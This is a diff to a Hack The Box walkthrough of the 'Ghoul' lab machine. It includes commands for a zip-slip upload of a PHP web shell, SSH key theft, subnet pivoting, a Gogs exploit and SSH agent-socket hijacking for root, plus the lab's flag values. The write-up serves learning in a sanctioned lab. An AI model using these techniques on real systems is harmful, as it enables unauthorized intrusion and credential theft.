@@ -18,7 +18,6 @@ tags:
   - p0wny
   - gogs
   - session hijacking
-  
 ---
 
 ![](/assets/images/htb-writeup-ghoul/ghoul.jpeg)
@@ -28,10 +27,17 @@ that it’s not for the faint of heart. I anticipate that this writeup will be m
 
 ## TLDR
 
-- TODO: Add Summary
+- First we log in to the web service running on port 8080 with `admin:admin` credentials
+- Then upload malicious zip file to trick zip extractor to put a php shell in the web root
+- Use php shell to download private keys from a backup folder
+- ssh to box as kaneki
+- use ssh pivoting to access other subnets and boxes
+- upload statically compiled binaries to assist with enumeration
+- Exploit Gogs server with Gogsownz
+- Peruse git commit history for password for archive file
+- Hijack root session
 
-
-### Scans Away
+## Scans Away
 
 As always, we start out with the basics! Let's run a quick TCP scan and save the results to the 
 nmap folder for later reference.
@@ -65,10 +71,12 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 We can see that SSH is running on 2 ports (22 & 2222). This is interesting, but let's come back to that in a bit.
 
-###Port 8080 - Web enumeration
+## Port 8080 - Web enumeration
+
 This web service is protected by basic auth. The protection is not so great as you can get in with `admin:admin` credentials.
 
 ### Evil Zipper
+
 This page is confusing as it has multiple divs, but keep watching the rotating upload div and you'll see
 an option to upload a `.zip` file. It appears that the code will take the zip file and extract it to
 an unknown location.
@@ -81,7 +89,7 @@ To do this, I used a project called EvilArc
 
 https://github.com/ptoomey3/evilarc
 
-```commandline0
+```commandline
 python exploit.py p0wny.php --os unix --path var/www/html/ --depth 3 --output evil3.zip
 
 python exploit.py p0wny.php --os unix --path var/www/html/ --depth 4 --output evil4.zip
@@ -92,7 +100,7 @@ python exploit.py p0wny.php --os unix --path var/www/html/ --depth 5 --output ev
 The appropriate depth in this case is 3. When this is uploaded, `p0wny.php` is extracted and placed into the html 
 folder. We now have our foothold!
 
-###Web Shell
+### Web Shell
 
 You can use p0wnyshell or several other php based shells to start browsing around the filesystem. Get used to it as you’ll be doing a lot of this!
 
@@ -138,6 +146,7 @@ Let’s skip that for now and look for another user with more privs. Logging in 
 Hopefully you downloaded or had a look at `secret.php` while you were browsing `/var/www/html` because you will need it.  
 
 Kaneki's password is: `ILoveTouka` (You should comit this to memory as you'll be typing it a lot!!)
+
 ```commandline
 root@kali:~/htb/machines/ghoul# ssh kaneki@10.10.10.101 -i kaneki.key
 Enter passphrase for key 'kaneki.key':
@@ -160,10 +169,10 @@ kaneki@Aogiri:~$ cat user.txt
 7c0f11041f210f4f7d1711d40a1c35c2
 ```
 
-###The Epic Journey to Root!
+## The Epic Journey to Root!
 Easy peasy so far, right? Well let's get ready to enter through the looking glass to find root.txt.
 
-####More Enumeration
+### More Enumeration
 ```commandline
 kaneki@Aogiri:~$ ./notes
 ./notes: line 1: Ive set up file server into the servers: command not found
@@ -273,7 +282,8 @@ let’s remember that, let’s also remember that there’s a kaneki_adm user (a
 
 
 
-####Another host, another subnet - 172.18.0.0/24
+### Another host, another subnet - 172.18.0.0/24
+
 Running ifconfig, we see that this box has two ip’s on two subnets. Let’s upload nmap here and scan the 172.18.0.0/24 domain
 
 ```commandline
@@ -336,7 +346,7 @@ There are 3 hosts on the 172.18.0.0/24 CIDR
 * Cuff_web_1.cuff_default (172.18.0.2)
 * Kaneki-pc (172.18.0.200 and 172.20.0.150)
 
-####Recon of 172.18.0.2
+#### Recon of 172.18.0.2
 
 ```commandline
 kaneki_pub@kaneki-pc:/tmp$ ./nmap 172.18.0.2 -p-
@@ -356,7 +366,7 @@ Nmap done: 1 IP address (1 host up) scanned in 1.80 seconds
 
 It’s not possible to connect to 22 without any more information. Time to do some port forwarding so we can recon port 3000!. It’s possible to do this a few ways, but let’s do this!
 
-####Pivoting!!
+### Pivoting!!
 
 127.0.0.1 3000 > 10.10.10.101 > 172.20.0.150
 
@@ -382,10 +392,10 @@ http://127.0.0.1:3000
 
 Found our Gogs Server!!!!
 
-###Welcome to Gogs!
+### Welcome to Gogs!
 Now that we have a Gog ui, we have to figure out how to get in. Brute-forcing will not solve anything. We know from enumeration that AogiriTest is our best candidate for a user account, but what is the password?
 
-####Enumeration - Part deux!
+#### Enumeration - Part deux!
 Eventually, we look back at our initial box (10.10.10.101 for those playing at home). As we may remember, there are two web services, one on port 80 running apache, and one on port 8080 running Tomcat, we have to find the tomcat home directories.
 
 Leaving your tunnel alone for now, open up yet another tmux pane and let’s find tomcat’s home directory in the .101 box
@@ -443,7 +453,7 @@ root@kali:~/htb/machines/ghoul/gogsownz# python3 gogsownz.py http://127.0.0.1:30
 
 **BE PATIENT, THIS WILL WORK BUT YOU MIGHT HAVE TO TRY A FEW TIMES **
 
-####172.18.0.2 - Gogs server enumeration
+#### 172.18.0.2 - Gogs server enumeration
 
 Root.txt is not here either… son of a gun! Have fun browsing around!
 
@@ -489,7 +499,7 @@ lrwxrwxrwx	1 root 	root         	9 Dec 29 06:41 .bash_history -> /dev/null
 
 Get that aogiri-app.7z file back to Kali via a bunch of scp commands
 
-###C'mon Git Happy!
+## C'mon Git Happy!
 * Step 1: Extract the .7z file
 * Step 2: browse to the folder
 * Step 3: use git reflog to get a full history of the repo
@@ -508,7 +518,7 @@ Password:
 root@kaneki-pc:/home/kaneki_pub#
 ```
 
-###Session Hijacking
+## Session Hijacking
 
 If you upload pspy64 to the box and run it, you’ll see that kaneki_adm logs in every 6 minutes. You must react quickly to catch the session and hijack it!
 
@@ -516,7 +526,8 @@ https://xorl.wordpress.com/2018/02/04/ssh-hijacking-for-lateral-movement/
 
 * Step 1: upload pspy64 to kaneki-pc 
 * Step 2: get two root connections on 172.18.0.200
-* Step 3: as soon as you see this come up in pspy64...
+* Step 3: as soon as you see this come up in pspy64
+
 ```commandline
 <snip>
 2019/05/10 13:12:01 CMD: UID=1001 PID=1675   | sshd: kaneki_adm     
@@ -524,6 +535,7 @@ https://xorl.wordpress.com/2018/02/04/ssh-hijacking-for-lateral-movement/
 <snip>
 ```
 … run this in your other pane. Your agent and ssh- values will be different than mine each time!
+
 ```commandline
 root@kaneki-pc:/home/kaneki_adm# find /tmp -name *agent* 
 root@kaneki-pc:/home/kaneki_adm# find /tmp -name "*agent*" 2>/dev/null
@@ -531,12 +543,12 @@ root@kaneki-pc:/home/kaneki_adm# find /tmp -name "*agent*" 2>/dev/null
 root@kaneki-pc:/home/kaneki_adm# SSH_AUTH_SOCK=/tmp/ssh-v2z2opBufh/agent.1675 ssh root@172.18.0.1 -p 2222
 ```
 
-
 If this works, you’ll have the following:
 
 ```commandline
 root@Aogiri:/# cat /root/root.txt
 7c0f11041f210f4fadff7c077539e72f
 ```
+
 And your done!!! Happy hacking!
 
